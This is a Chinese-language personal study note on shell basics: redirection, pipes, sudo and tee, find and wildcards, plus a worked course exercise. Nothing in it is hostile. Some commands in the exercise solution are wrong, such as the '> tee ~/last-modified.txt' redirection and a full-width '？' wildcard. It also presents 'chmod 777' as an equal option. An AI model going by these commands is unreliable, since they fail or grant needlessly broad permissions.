<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#note-cs-tms-overview-and-shell-__codelineno-31-1"></a>cat<span class="w"> </span>&lt;<span class="w"> </span>output.txt<span class="w"> </span>&gt;<span class="w"> </span>input.txt
</span></code></pre></div>
<p>这将把<code>output.txt</code>文件的内容重定向到<code>input.txt</code>文件中,如果<code>input.txt</code>文件不存在,将会创建一个<code>input.txt</code>文件,如果<code>input.txt</code>文件存在,将会覆盖<code>input.txt</code>文件的内容</p>
<p>如果我们不想要覆盖<code>input.txt</code>文件的内容,而是想要在<code>input.txt</code>文件的末尾添加内容,可以使用<code>&gt;&gt;</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#note-cs-tms-overview-and-shell-__codelineno-32-1"></a>cat<span class="w"> </span>output.txt<span class="w"> </span>&gt;&gt;<span class="w"> </span>input.txt
</span></code></pre></div>
<p>这将把<code>output.txt</code>文件的内容添加到<code>input.txt</code>文件的末尾(append)</p>
<h3 id="note-cs-tms-overview-and-shell-pipe">Pipe<a class="headerlink" href="#note-cs-tms-overview-and-shell-pipe" title="Permanent link">&para;</a></h3>
<p>管道<code>|</code>是一种将左边命令的输出作为右边命令的输入的机制。</p>
<p>例如</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#note-cs-tms-overview-and-shell-__codelineno-33-1"></a>cat<span class="w"> </span>output.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;Hello&quot;</span>
</span></code></pre></div>
<p>这将把<code>output.txt</code>文件的内容作为<code>grep</code>命令的输入,并返回包含<code>Hello</code>的行</p>
<p>假设我只想要<code>ls -l</code>的最后一行 </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#note-cs-tms-overview-and-shell-__codelineno-34-1"></a>ls<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;<span class="w"> </span>output.txt
</span></code></pre></div>
<p>这将把<code>ls -l</code>的最后一行作为<code>tail</code>命令的输入,并把最后一行(<code>tail</code>命令的<code>-n</code>选项表示返回最后<code>n</code>行)输出到<code>output.txt</code>文件中</p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>在这个过程中，<code>ls</code>不知道什么是<code>tail</code>，<code>tail</code>也不知道什么是<code>ls</code>，它们只是正常的执行命令，而pipe机制将它们的输出和输入连接了起来</p>
</div>
<h2 id="note-cs-tms-overview-and-shell-root-user">Root user<a class="headerlink" href="#note-cs-tms-overview-and-shell-root-user" title="Permanent link">&para;</a></h2>
<p>在Linux中，<code>root</code>用户是超级用户，拥有最高的权限，可以执行任何命令，修改任何文件，删除任何文件，创建任何文件，甚至可以删除其他用户。</p>
<p><code>root</code>用户的UID是0，GID是0</p>
<blockquote>
<p>一般情况下，我们不会使用<code>root</code>用户登录，否则万一不小心以root权限执行了错误的命令，Oops，你的电脑崩溃了</p>
</blockquote>
<p>某些情况下，我们需要使用<code>root</code>用户的权限,这时候我们可以使用<code>sudo</code>命令(do as super user)</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#note-cs-tms-overview-and-shell-__codelineno-35-1"></a>sudo<span class="w"> </span><span class="o">[</span>命令<span class="o">]</span>
</span></code></pre></div>
<p>这将使用<code>root</code>用户的权限执行命令</p>
<p>当使用<code>sudo</code>命令时，系统会提示你输入密码，这是为了防止误操作</p>
<p>例如我们想要修改亮度的配置文件</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#note-cs-tms-overview-and-shell-__codelineno-36-1"></a><span class="nb">echo</span><span class="w"> </span><span class="m">500</span><span class="w"> </span>&gt;<span class="w"> </span>/sys/class/backlight/intel_backlight/brightness
</span></code></pre></div>
<p>这将得到</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#note-cs-tms-overview-and-shell-__codelineno-37-1"></a>permission<span class="w"> </span>denied
</span></code></pre></div>
<p>这时候我们就可以使用<code>sudo</code>命令</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#note-cs-tms-overview-and-shell-__codelineno-38-1"></a>sudo<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">500</span><span class="w"> </span>&gt;<span class="w"> </span>/sys/class/backlight/intel_backlight/brightness
</span></code></pre></div>
<p>仍然是</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#note-cs-tms-overview-and-shell-__codelineno-39-1"></a>permission<span class="w"> </span>denied
</span></code></pre></div>
<p>这是因为我们在前面说过,重定向两边并不知道彼此,也就是说shell看到的是我们以<code>root</code>权限执行了<code>echo 500</code> ，然后在**普通用户**下打开<code>brightness</code>文件将结果输入进去，所以会报错</p>
<p>想要解决这个问题,可以切换到<code>root</code>用户</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#note-cs-tms-overview-and-shell-__codelineno-40-1"></a>sudo<span class="w"> </span>su
</span></code></pre></div>
<p>这时候我们就可以直接执行,值得注意的一点是,切换为<code>root</code>用户后,提示符从<code>$</code>或者其它你自定义的提示符变为<code>#</code></p>
<p>或者更加优雅的方式是</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#note-cs-tms-overview-and-shell-__codelineno-41-1"></a><span class="nb">echo</span><span class="w"> </span><span class="m">500</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/sys/class/backlight/intel_backlight/brightness
</span></code></pre></div>
<p>这时候我们告诉<code>shell</code>，正常执行<code>echo 500</code>，然后使用<code>sudo tee</code>命令将结果输出到<code>/sys/class/backlight/intel_backlight/brightness</code>文件。</p>
<p><code>tee</code>命令会从标准输入读取数据，并同时写入到标准输出和文件。即写入文件的同时，也会在终端中显示出写入的内容。</p>
<blockquote>
<p>Tips: <code>xdg-open</code>命令可以以适当的程序打开一个文件</p>
</blockquote>
<h2 id="note-cs-tms-overview-and-shell-find">Find<a class="headerlink" href="#note-cs-tms-overview-and-shell-find" title="Permanent link">&para;</a></h2>
<p><code>find</code> 命令是一个强大的工具，用于在文件系统中查找文件和目录。它可以根据各种条件（如名称、类型、大小、修改时间等）进行搜索，并支持递归搜索子目录。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#note-cs-tms-overview-and-shell-__codelineno-42-1"></a>find<span class="w"> </span><span class="o">[</span>搜索路径<span class="o">]</span><span class="w"> </span><span class="o">[</span>搜索条件<span class="o">]</span><span class="w"> </span><span class="o">[</span>操作<span class="o">]</span>
</span></code></pre></div>
<ul>
<li><strong>搜索路径</strong>：指定要搜索的目录路径。如果不指定，默认为当前目录。</li>
<li><strong>搜索条件</strong>：指定查找文件的条件，如名称、类型、大小等。</li>
<li>
<p><strong>操作</strong>：指定对找到的文件执行的操作，如删除、打印等。</p>
</li>
<li>
<p><code>-name [名称]</code>：按名称查找文件。</p>
</li>
<li><code>-type [类型]</code>：按文件类型查找，如 <code>f</code> 表示文件，<code>d</code> 表示目录。</li>
<li><code>-size [大小]</code>：按文件大小查找。</li>
<li><code>-mtime [天数]</code>：按修改时间查找，<code>-mtime +n</code> 表示 n 天前修改的文件，<code>-mtime -n</code> 表示 n 天内修改的文件。</li>
<li><code>-exec [命令] {} \;</code>：对找到的文件执行指定命令。</li>
<li><code>-L</code>：跟随符号链接，解析符号链接为其指向的实际文件或目录。</li>
</ul>
<p>一些例子如下</p>
<ol>
<li>
<p><strong>查找当前目录下名为 <code>example.txt</code> 的文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#note-cs-tms-overview-and-shell-__codelineno-43-1"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;example.txt&quot;</span>
</span></code></pre></div>
</li>
<li>
<p><strong>查找 <code>/home/user</code> 目录下所有 <code>.txt</code> 文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#note-cs-tms-overview-and-shell-__codelineno-44-1"></a>find<span class="w"> </span>/home/user<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.txt&quot;</span>
</span></code></pre></div>
</li>
<li>
<p><strong>查找当前目录下所有大于 100MB 的文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#note-cs-tms-overview-and-shell-__codelineno-45-1"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-size<span class="w"> </span>+100M
</span></code></pre></div>
</li>
<li>
<p><strong>查找 <code>/var/log</code> 目录下 7 天前修改的文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#note-cs-tms-overview-and-shell-__codelineno-46-1"></a>find<span class="w"> </span>/var/log<span class="w"> </span>-mtime<span class="w"> </span>+7
</span></code></pre></div>
</li>
<li>
<p><strong>查找并删除当前目录下所有 <code>.tmp</code> 文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#note-cs-tms-overview-and-shell-__codelineno-47-1"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.tmp&quot;</span><span class="w"> </span>-exec<span class="w"> </span>rm<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span>
</span></code></pre></div>
</li>
<li>
<p><strong>查找并列出 <code>/etc</code> 目录下所有目录：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#note-cs-tms-overview-and-shell-__codelineno-48-1"></a>find<span class="w"> </span>/etc<span class="w"> </span>-type<span class="w"> </span>d
</span></code></pre></div>
</li>
<li>
<p><strong>查找并跟随符号链接：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#note-cs-tms-overview-and-shell-__codelineno-49-1"></a>find<span class="w"> </span>-L<span class="w"> </span>/path/to/search<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;example.txt&quot;</span>
</span></code></pre></div>
<p>这将查找 <code>/path/to/search</code> 目录及其子目录中名为 <code>example.txt</code> 的文件，并跟随任何符号链接。</p>
</li>
</ol>
<div class="admonition info">
<p class="admonition-title">符号链接</p>
<p>在文件系统中，符号链接（symbolic link）是一种特殊类型的文件，它指向另一个文件或目录。符号链接类似于 Windows 中的快捷方式，它们不包含实际数据，而是指向目标文件或目录的路径。</p>
<p>当我们说“跟随符号链接”时，意思是当一个命令（如 <code>find</code>）遇到符号链接时，它会解析这个链接并继续在链接指向的目标文件或目录中执行操作。换句话说，命令会将符号链接视为其指向的实际文件或目录，而不是仅仅将其视为一个链接。</p>
<p>假设我们有以下文件结构：</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#note-cs-tms-overview-and-shell-__codelineno-50-1"></a>/home/user
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#note-cs-tms-overview-and-shell-__codelineno-50-2"></a>├── actual_file.txt
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#note-cs-tms-overview-and-shell-__codelineno-50-3"></a>└── link_to_file.txt -&gt; /home/user/actual_file.txt
</span></code></pre></div>
<p>在这个例子中，<code>link_to_file.txt</code> 是一个符号链接，指向 <code>actual_file.txt</code>。</p>
<ul>
<li><strong>不跟随符号链接</strong>：默认情况下，<code>find</code> 不会跟随符号链接。这意味着如果你在 <code>/home/user</code> 目录中使用 <code>find</code> 查找文件，<code>link_to_file.txt</code> 会被视为一个符号链接，而不会进一步查找 <code>actual_file.txt</code>。</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#note-cs-tms-overview-and-shell-__codelineno-51-1"></a>find<span class="w"> </span>/home/user<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;actual_file.txt&quot;</span>
</span></code></pre></div>
<p>这将直接找到 <code>actual_file.txt</code>，而不会考虑 <code>link_to_file.txt</code>。</p>
<ul>
<li><strong>跟随符号链接</strong>：使用 <code>-L</code> 参数，<code>find</code> 会跟随符号链接。这意味着 <code>find</code> 会将 <code>link_to_file.txt</code> 解析为 <code>actual_file.txt</code>，并在其指向的目标中继续查找。</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#note-cs-tms-overview-and-shell-__codelineno-52-1"></a>find<span class="w"> </span>-L<span class="w"> </span>/home/user<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;actual_file.txt&quot;</span>
</span></code></pre></div>
<p>这将找到 <code>actual_file.txt</code>，即使它是通过 <code>link_to_file.txt</code> 访问的。</p>
<p>跟随符号链接在某些情况下非常有用，特别是当你希望在符号链接指向的目录中执行操作时。</p>
</div>
<h3 id="note-cs-tms-overview-and-shell-_2">通配符查找<a class="headerlink" href="#note-cs-tms-overview-and-shell-_2" title="Permanent link">&para;</a></h3>
<p><code>find</code> 命令支持使用通配符进行查找，常用的通配符包括 <code>*</code>、<code>?</code> 和 <code>[]</code>。</p>
<ul>
<li><code>*</code>：匹配零个或多个字符。</li>
<li><code>?</code>：匹配单个字符。</li>
<li><code>[]</code>：匹配括号内的任意一个字符。</li>
<li>
<p><code>{}</code>：扩展括号内的元素。</p>
</li>
<li>
<p><strong>查找当前目录下所有以 <code>.log</code> 结尾的文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#note-cs-tms-overview-and-shell-__codelineno-53-1"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.log&quot;</span>
</span></code></pre></div>
</li>
<li>
<p><strong>查找当前目录下所有以 <code>file</code> 开头并以任意单个字符结尾的文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#note-cs-tms-overview-and-shell-__codelineno-54-1"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;file?&quot;</span>
</span></code></pre></div>
</li>
<li>
<p><strong>查找当前目录下所有以 <code>file</code> 开头并以 <code>1</code>、<code>2</code> 或 <code>3</code> 结尾的文件：</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#note-cs-tms-overview-and-shell-__codelineno-55-1"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;file[123]&quot;</span>
</span></code></pre></div>
</li>
</ul>
<p>通配符也可以在其它命令如<code>ls</code>中使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#note-cs-tms-overview-and-shell-__codelineno-56-1"></a>ls<span class="w"> </span>*.txt
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#note-cs-tms-overview-and-shell-__codelineno-56-2"></a>ls<span class="w"> </span>file<span class="o">[</span><span class="m">123</span><span class="o">]</span>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#note-cs-tms-overview-and-shell-__codelineno-56-3"></a>ls<span class="w"> </span>file？
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#note-cs-tms-overview-and-shell-__codelineno-57-1"></a>ls<span class="w"> </span>file<span class="o">{</span><span class="m">1</span>,2,3<span class="o">}</span>
</span></code></pre></div>
将会变为</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#note-cs-tms-overview-and-shell-__codelineno-58-1"></a>ls<span class="w"> </span>file1<span class="w"> </span>file2<span class="w"> </span>file3
</span></code></pre></div>
<div class="admonition info">
<p class="admonition-title">find 和 locate</p>
<p><code>locate</code>命令和<code>find</code>命令类似，但是<code>locate</code>命令使用的是数据库，所以速度更快。</p>
<p><code>locate</code>命令会返回所有包含指定字符串的文件路径。</p>
</div>
<h2 id="note-cs-tms-overview-and-shell-_3">课后习题<a class="headerlink" href="#note-cs-tms-overview-and-shell-_3" title="Permanent link">&para;</a></h2>
<p>题目如下</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec1.png" width="70%" />

<figcaption>课后习题</figcaption>
</figure>
<h3 id="note-cs-tms-overview-and-shell-solutions">solutions<a class="headerlink" href="#note-cs-tms-overview-and-shell-solutions" title="Permanent link">&para;</a></h3>
<p>首先<code>cd /tmp</code>进入<code>tmp</code>目录,然后创建目录使用<code>mkdir</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#note-cs-tms-overview-and-shell-__codelineno-59-1"></a>mkdir<span class="w"> </span>missing
</span></code></pre></div>
<p>然后<code>man</code>查看<code>touch</code>命令</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#note-cs-tms-overview-and-shell-__codelineno-60-1"></a>man<span class="w"> </span>touch
</span></code></pre></div>
<p><code>touch</code> 是一个常用的命令行工具，主要用于在文件系统中创建新的空文件或更新现有文件的时间戳。以下是 <code>touch</code> 命令的基本用法和功能：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#note-cs-tms-overview-and-shell-__codelineno-61-1"></a>touch<span class="w"> </span><span class="o">[</span>选项<span class="o">]</span><span class="w"> </span>文件名
</span></code></pre></div>
<ul>
<li>
<p>如果指定的文件不存在，<code>touch</code> 会创建一个新的空文件。例如：
  <div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#note-cs-tms-overview-and-shell-__codelineno-62-1"></a>touch<span class="w"> </span>newfile.txt
</span></code></pre></div>
  这将创建一个名为 <code>newfile.txt</code> 的新文件。</p>
</li>
<li>
<p>如果指定的文件已经存在，<code>touch</code> 会更新该文件的访问时间（atime）和修改时间（mtime）为当前时间，而不改变文件的内容。例如：
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#note-cs-tms-overview-and-shell-__codelineno-63-1"></a>touch<span class="w"> </span>existingfile.txt
</span></code></pre></div></p>
</li>
<li>
<p><code>-a</code>：仅更新访问时间。
  <div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#note-cs-tms-overview-and-shell-__codelineno-64-1"></a>touch<span class="w"> </span>-a<span class="w"> </span>filename
</span></code></pre></div></p>
</li>
<li>
<p><code>-m</code>：仅更新修改时间。
  <div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#note-cs-tms-overview-and-shell-__codelineno-65-1"></a>touch<span class="w"> </span>-m<span class="w"> </span>filename
</span></code></pre></div></p>
</li>
<li>
<p><code>-t</code>：使用指定的时间戳（格式为 <code>[[CC]YY]MMDDhhmm[.ss]</code>）。
  <div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#note-cs-tms-overview-and-shell-__codelineno-66-1"></a>touch<span class="w"> </span>-t<span class="w"> </span><span class="m">202310101200</span>.00<span class="w"> </span>filename
</span></code></pre></div></p>
</li>
<li>
<p><code>-c</code>：如果文件不存在，则不创建文件。
  <div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#note-cs-tms-overview-and-shell-__codelineno-67-1"></a>touch<span class="w"> </span>-c<span class="w"> </span>filename
</span></code></pre></div></p>
</li>
</ul>
<p>在这里我们直接</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#note-cs-tms-overview-and-shell-__codelineno-68-1"></a>touch<span class="w"> </span>semester
</span></code></pre></div>
<p>即可</p>
<p>然后向<code>semester</code>文件中写入两行,这里已经给出提示了</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#note-cs-tms-overview-and-shell-__codelineno-69-1"></a><span class="w"> </span><span class="c1">#!/bin/sh</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#note-cs-tms-overview-and-shell-__codelineno-69-2"></a><span class="w"> </span>curl<span class="w"> </span>--head<span class="w"> </span>--silent<span class="w"> </span>https://missing.csail.mit.edu
</span></code></pre></div>
<p>需要用<code>''</code>而不是<code>" "</code>,官方文档的解释如下</p>
<hr />
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec1-1.png" width="60%" />

<figcaption>官方文档</figcaption>
</figure>
<hr />
<p>也就是说在双引号中"!"仍然是有特殊意义的</p>
<p>那么只要使用单引号就行了</p>
<p>可以使用<code>echo</code>命令加上<code>&gt;&gt;</code>输入两次</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#note-cs-tms-overview-and-shell-__codelineno-70-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/sh&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>semester
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#note-cs-tms-overview-and-shell-__codelineno-70-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;curl --head --silent https://missing.csail.mit.edu&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>semester
</span></code></pre></div>
<p>或者加上参数<code>-e</code>使用换行符</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#note-cs-tms-overview-and-shell-__codelineno-71-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;#!/bin/sh\ncurl --head --silent https://missing.csail.mit.edu&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>semester
</span></code></pre></div>
<p>或者使用<code>tee</code>命令</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#note-cs-tms-overview-and-shell-__codelineno-72-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/sh&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>semester
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#note-cs-tms-overview-and-shell-__codelineno-72-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;curl --head --silent https://missing.csail.mit.edu&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>semester
</span></code></pre></div>
<p><code>-a</code>参数表示追加到文件末尾</p>
<p>当然不使用pipe直接手动tee输入也是可以的,最后使用<code>^D</code>结束输入</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#note-cs-tms-overview-and-shell-__codelineno-73-1"></a>tee<span class="w"> </span>semester
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#note-cs-tms-overview-and-shell-__codelineno-73-2"></a><span class="c1">#!/bin/sh   </span>
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#note-cs-tms-overview-and-shell-__codelineno-73-3"></a>curl<span class="w"> </span>--head<span class="w"> </span>--silent<span class="w"> </span>https://missing.csail.mit.edu
</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#note-cs-tms-overview-and-shell-__codelineno-73-4"></a>^D
</span></code></pre></div>
<p>也可以</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#note-cs-tms-overview-and-shell-__codelineno-74-1"></a>tee<span class="w"> </span>semester<span class="w"> </span><span class="s">&lt;&lt; EOF</span>
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#note-cs-tms-overview-and-shell-__codelineno-74-2"></a><span class="s">#!/bin/sh</span>
</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#note-cs-tms-overview-and-shell-__codelineno-74-3"></a>
</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#note-cs-tms-overview-and-shell-__codelineno-74-4"></a><span class="s">curl --head --silent https://missing.csail.mit.edu</span>
</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#note-cs-tms-overview-and-shell-__codelineno-74-5"></a><span class="s">EOF</span>
</span></code></pre></div>
<p>然后尝试执行这个文件</p>
<p>发现文件没有执行权限,<code>ls -l</code>之后发现就算是root用户也没有执行权限</p>
<p>第一种方法是使用<code>sh</code>命令</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#note-cs-tms-overview-and-shell-__codelineno-75-1"></a>sh<span class="w"> </span>semester
</span></code></pre></div>
<p>而我们能使用<code>sh</code>命令是因为<code>semester</code>文件的第一行是<code>#!/bin/sh</code></p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>在 Unix 和 Unix-like 操作系统中，shell 脚本通常通过文件的第一行（称为 shebang）来指定使用哪个解释器来执行脚本。Shebang 是一个由 #! 开头的行，后面跟着解释器的路径</p>
</div>
<p>不使用<code>sh</code>命令,使用<code>./</code>执行也是可以的，但是首先需要给文件添加执行权限</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#note-cs-tms-overview-and-shell-__codelineno-76-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>semester
</span></code></pre></div>
<p>这个给文件添加了执行权限,然后就可以使用<code>./semester</code>执行了</p>
<p>或者</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#note-cs-tms-overview-and-shell-__codelineno-77-1"></a>chmod<span class="w"> </span><span class="m">777</span><span class="w"> </span>semester
</span></code></pre></div>
<p>777表示所有用户都有读写执行权限，这样写是因为权限是三位一组的，用二进制表示为111，即7，代表既可读又可写又可执行，777表示所有用户都有读写执行权限</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec1-2.png" width="60%" />

<figcaption>示意图</figcaption>
</figure>
<p>执行之后会给我们一堆信息，需要从中提取出<code>Last-Modified</code>存放到home directory下的<code>last-modified</code>文件中</p>
<p>一开始我以为是<code>\home</code>目录,所以我的命令是</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#note-cs-tms-overview-and-shell-__codelineno-78-1"></a>./semester<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;last-modified&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/home/last-modified.txt
</span></code></pre></div>
<p>然而题目要求使用<code>&gt;</code>,重定向，所以应该是<code>~</code>目录</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#note-cs-tms-overview-and-shell-__codelineno-79-1"></a>./semester<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;last-modified&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>tee<span class="w"> </span>~/last-modified.txt
</span></code></pre></div>
<p>最后<code>cat</code>检查一下就好了</p>
<div class="language-zsh highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#note-cs-tms-overview-and-shell-__codelineno-80-1"></a><span class="w">    </span>cat<span class="w"> </span>/home/last-modified.txt
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#note-cs-tms-overview-and-shell-__codelineno-80-2"></a><span class="w">    </span>cat<span class="w"> </span>~/last-modified
</span></code></pre></div>
<p>最后一个就简单了，只需要我们获取电量信息</p>
